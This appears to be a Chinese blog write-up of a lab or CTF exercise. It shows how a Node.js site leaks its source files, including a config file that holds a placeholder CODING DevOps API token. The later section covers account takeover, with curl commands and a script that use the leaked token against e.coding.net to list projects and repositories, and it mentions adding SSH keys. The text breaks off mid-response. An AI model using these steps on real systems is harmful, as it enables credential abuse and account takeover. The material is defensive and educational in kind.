class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="variable constant_">CONFIG</span></span><br></pre></td></tr></table></figure><p>这里提到了 coding 还有用户名密码 （假的）并不知道 coding 是什么的情况下。 网站也没有登陆口。</p></li><li><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">16</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install &amp;&amp; npm install -g pm2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">443</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;/app/ecosystem.config.js&quot;</span>, <span class="string">&quot;--env&quot;</span>, <span class="string">&quot;production&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>这里所有的证据都说明了 这个网站泄漏了源代码 也就是 js 文件 </p><p>接下来测试是否存在 ecosystem.config.js 文件 来验证这个结论</p><p>我们可以试试 <a href="https://127.0.0.1/ecosystem.config.js">https://127.0.0.1/ecosystem.config.js</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/</span></span><br><span class="line">const package = require(&#x27;./package.json&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = <span class="punctuation">&#123;</span></span><br><span class="line">    apps<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        name               <span class="punctuation">:</span> package.name<span class="punctuation">,</span></span><br><span class="line">        script             <span class="punctuation">:</span> &#x27;app.js&#x27;<span class="punctuation">,</span></span><br><span class="line">        args               <span class="punctuation">:</span> &#x27;one two&#x27;<span class="punctuation">,</span></span><br><span class="line">        instances          <span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        autorestart        <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        watch              <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        ignore_watch       <span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;node_modules&#x27;<span class="punctuation">,</span> &#x27;logs&#x27;<span class="punctuation">,</span> &#x27;.git&#x27;<span class="punctuation">,</span> &#x27;statics&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        error_file         <span class="punctuation">:</span> &#x27;logs/err.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        out_file           <span class="punctuation">:</span> &#x27;logs/out.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_file           <span class="punctuation">:</span> &#x27;logs/all.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_date_format    <span class="punctuation">:</span> &#x27;YYYY-MM-DD HH<span class="punctuation">:</span>mm<span class="punctuation">:</span>ss&#x27;<span class="punctuation">,</span></span><br><span class="line">        max_memory_restart <span class="punctuation">:</span> &#x27;<span class="number">1</span>G&#x27;<span class="punctuation">,</span></span><br><span class="line">        env<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;development&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        env_production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;production&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    deploy<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="comment">// host          : CONFIG.remote.host,</span></span><br><span class="line">            <span class="comment">// user          : CONFIG.remote.user,</span></span><br><span class="line">            <span class="comment">// path          : CONFIG.remote.path,</span></span><br><span class="line">            <span class="comment">// repo          : CONFIG.git.ssh,</span></span><br><span class="line">            <span class="comment">// ref           : CONFIG.git.ref,</span></span><br><span class="line">            &#x27;post-deploy&#x27; <span class="punctuation">:</span> &#x27;npm install &amp;&amp; pm2 reload ecosystem.config.js --env production&#x27;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>;</span><br></pre></td></tr></table></figure><p>很明显是存在 js 代码泄漏的</p><h3 id="检查-middleware"><a href="#检查-middleware" class="headerlink" title="检查 middleware"></a>检查 middleware</h3><p>通过 app.js 文件</p><p>可以翻找到 如下的库与中间件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line">const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line">const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line">const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br></pre></td></tr></table></figure><p>api listen route template 四个分别通过依赖注入的方式引入</p><p>这里直接去看 api </p><p>对于 api 分别尝试这三个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/middlewares/api.js</span><br><span class="line">https://127.0.0.1/middlewares/api</span><br><span class="line">https://127.0.0.1/middlewares/api/index.js</span><br></pre></td></tr></table></figure><p>可以发现 index.js 有返回</p><p>如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs       = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path     = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router   = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> tools    = <span class="built_in">require</span>(<span class="string">&#x27;../../utils&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Response</span> = <span class="built_in">require</span>(<span class="string">&#x27;../response&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// apiPath 为 当前目录的上上级 也就是 / 下 是可以访问的</span></span><br><span class="line"><span class="keyword">const</span> apiPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../../api&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是网站自己实现的 CGI </span></span><br><span class="line"><span class="comment">// 动态的在 api 文件夹下所有的 js 文件注册进来 并且赋予对应的 path</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">registeApi</span> (dir) &#123;</span><br><span class="line">    <span class="comment">// 遍历目录下所有文件</span></span><br><span class="line">    fs.<span class="title function_">readdirSync</span>(dir).<span class="title function_">forEach</span>(<span class="function"><span class="params">fileName</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 文件完整路径</span></span><br><span class="line">        <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(dir, fileName)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若该文件为目录，则继续遍历该目录下所有文件</span></span><br><span class="line">        <span class="keyword">if</span> (fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isDirectory</span>()) <span class="keyword">return</span> <span class="title function_">registeApi</span>(filePath)</span><br><span class="line">        <span class="comment">// 忽略入口文件</span></span><br><span class="line">        <span class="comment">// if (filePath.endsWith(&#x27;index.js&#x27;))       return</span></span><br><span class="line">        <span class="comment">// 忽略非 js 文件</span></span><br><span class="line">        <span class="keyword">if</span> (!filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>))           <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;非 JS 文件不要放在 api 目录下&#x27;</span> + filePath)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">regist</span>(filePath);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册单个 api </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">regist</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="comment">// API</span></span><br><span class="line">    <span class="comment">// 通过 filePath 引入</span></span><br><span class="line">    <span class="keyword">const</span> api     = <span class="built_in">require</span>(filePath)</span><br><span class="line">    <span class="comment">// API 名称</span></span><br><span class="line">    <span class="keyword">const</span> apiName = <span class="title function_">getApiName</span>(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历请求方式</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(api)) &#123;</span><br><span class="line">        <span class="comment">// 响应操作 写入 router </span></span><br><span class="line">        router[type](apiName, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> api[type](<span class="title function_">getRequest</span>(ctx), <span class="keyword">new</span> <span class="title class_">Response</span>(ctx))</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// 打印接口信息</span></span><br><span class="line">        <span class="title function_">apiLog</span>(type, apiName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去掉 .js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getApiName</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> filePath.<span class="title function_">cutEnd</span>(<span class="number">3</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(apiPath, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getRequest</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        params : &#123; ...ctx.<span class="property">request</span>.<span class="property">body</span>, ...tools.<span class="title function_">getUrlParams</span>(ctx.<span class="property">request</span>.<span class="property">url</span>) &#125;,</span><br><span class="line">        page   : tools.<span class="title function_">getPagination</span>(ctx),</span><br><span class="line">        ctx,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">apiLog</span> (type, apiName, apiIntro = <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;apiIntro&#125;</span>\n[<span class="subst">$&#123;type.toUpperCase()&#125;</span>]: <span class="subst">$&#123;apiName&#125;</span>\n****************************************`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// require 时注册 APIPATH</span></span><br><span class="line"><span class="title function_">registeApi</span>(apiPath)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = (<span class="function">() =&gt;</span> router.<span class="title function_">routes</span>())()</span><br></pre></td></tr></table></figure><h3 id="整理逻辑-发现端倪"><a href="#整理逻辑-发现端倪" class="headerlink" title="整理逻辑 发现端倪"></a>整理逻辑 发现端倪</h3><p>在 /api/XXX 下的 任何 /api/path/to/api.js 都会被注册成 /path/to/api </p><p>那么 查看 / 下的所有请求出去的 api 你可以直接 grep 拿到如下的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://fastly.jsdelivr.net/npm/axios@0.21.1/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/projectList&#x27;</span>)</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/versionList&#x27;</span>, &#123;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distList&#x27;</span>, &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distExist&#x27;</span>, &#123;</span><br></pre></td></tr></table></figure><p>一共 4 个 api </p><blockquote><p>无论是哪个 api 你都可以进行跟踪</p></blockquote><p>例如第二个 api <code>/v2/coding/versionList</code> 所在的位置根据上面 middleware/api 的推断</p><p>可以发现放在了如下的位置</p><blockquote><p>喜欢写注释真是好程序员 (确信)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v2/coding/versionList.js</span><br></pre></td></tr></table></figure><p>访问后我们可以得到如下的 js 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> coding = <span class="built_in">require</span>(<span class="string">&#x27;../../../request/coding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> distExtname = [</span><br><span class="line">    <span class="string">&#x27;.tgz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.exe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.dmg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.AppImage&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">get</span>(<span class="params">request, response</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">ProjectId</span> = <span class="title class_">Number</span>(request.<span class="property">params</span>.<span class="property">ProjectId</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> data = []</span><br><span class="line"><span class="comment">// post to 一个后端 </span></span><br><span class="line">        <span class="keyword">const</span> storeList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">            <span class="title class_">Action</span>: <span class="string">&#x27;DescribeProjectDepotInfoList&#x27;</span>,</span><br><span class="line">            <span class="title class_">ProjectId</span>,</span><br><span class="line">        &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">DepotData</span>.<span class="property">Depots</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> store <span class="keyword">of</span> storeList) &#123;</span><br><span class="line">            <span class="keyword">const</span> versionList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">                <span class="title class_">Action</span>: <span class="string">&#x27;DescribeGitReleases&#x27;</span>,</span><br><span class="line">                <span class="title class_">DepotId</span>: <span class="title class_">Number</span>(store.<span class="property">Id</span>),</span><br><span class="line">                <span class="title class_">Status</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageNumber</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageSize</span>: <span class="number">100</span>,</span><br><span class="line">            &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">ReleasePageList</span>.<span class="property">Releases</span></span><br><span class="line"></span><br><span class="line">            data = [...data, ...versionList]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">TagName</span> &lt; b.<span class="property">TagName</span> ? <span class="number">1</span> : -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">setData</span>(data)</span><br><span class="line">        response.<span class="title function_">success</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现他是另一个后端 api 的代理 而那个后端定义在 request/coding 中</p><h3 id="获得-token"><a href="#获得-token" class="headerlink" title="获得 token"></a>获得 token</h3><p>我们可以通过相对的路径得到 url </p><p>访问 <a href="http://127.0.0.1/request/coding.js">http://127.0.0.1/request/coding.js</a> 中获取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access Token</span></span><br><span class="line"><span class="keyword">const</span> codingToken = <span class="string">&#x27;token e(This_Is_real_Token)c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> coding = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;https://e.coding.net&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="title class_">Authorization</span>: codingToken,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = coding</span><br></pre></td></tr></table></figure><p>网上搜索 e.coding.net  发现是一个 devops 平台 具有相当的利用价值</p><p>同时这里也暴露了 对应的 Token</p><h3 id="接管用户账户"><a href="#接管用户账户" class="headerlink" title="接管用户账户"></a>接管用户账户</h3><p>进一步使用搜索引擎可以发现对应的 openapi 文档 <a href="https://coding.net/help/openapi">https://coding.net/help/openapi</a></p><blockquote><p>如果发现了项目 <a href="https://github.com/Esonhugh/tencent-coding-openapi/">https://github.com/Esonhugh/tencent-coding-openapi/</a></p><p>这里提供了非常方便的利用工具 可以一键列出项目和仓库 并且可以增加 ssh keys 只需要导入一个 api token 即可。</p></blockquote><p>发现是个人 api （token 开头）</p><p>列出项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeCodingProjects&quot;,</span></span><br><span class="line"><span class="string">  &quot;PageNumber&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;PageSize&quot;: 10</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_projects</span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:54 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10bcd5a9-7d9a-4a80-a1ec-e833d4c89d77&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;TotalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ProjectList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UpdatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;MaxMember&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;DisplayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak my git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wow! you got there! SuperCool man!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/static/project_icon/scenery-version-2-10.svg&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UserOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;StartDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;EndDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;IsDemo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProgramIds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>列出仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeProjectDepotInfoList&quot;,</span></span><br><span class="line"><span class="string">  &quot;ProjectId&quot;: 11414022</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_repos   </span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:00 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span 